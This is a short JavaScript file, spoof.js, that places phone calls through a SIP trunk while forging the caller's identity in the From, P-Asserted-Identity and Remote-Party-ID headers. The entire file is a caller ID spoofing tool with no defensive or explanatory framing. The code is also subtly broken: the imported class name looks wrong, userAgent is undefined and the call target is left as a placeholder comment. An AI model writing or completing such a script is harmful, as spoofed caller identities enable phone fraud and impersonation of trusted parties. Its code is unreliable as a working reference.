// spoof.js
const { INVITE } = require("sip.js");
const trunk = {
  uri: "sip:YOUR_USER@sip.sip24.cc",
  password: "YOUR_PASS",
  authorizationUsername: "YOUR_USER"
};

async function spoofCall(to, cli) {
  const inviter = new INVITE(userAgent, {
    // ... target
    extraHeaders: [
      `From: <sip:${cli}@sip.sip24.cc>`,
      `P-Asserted-Identity: <sip:${cli}@sip.sip24.cc>`,
      `Remote-Party-ID: <sip:${cli}@sip.sip24.cc>;party=calling;privacy=off`
    ]
  });
  await inviter.invite();
}
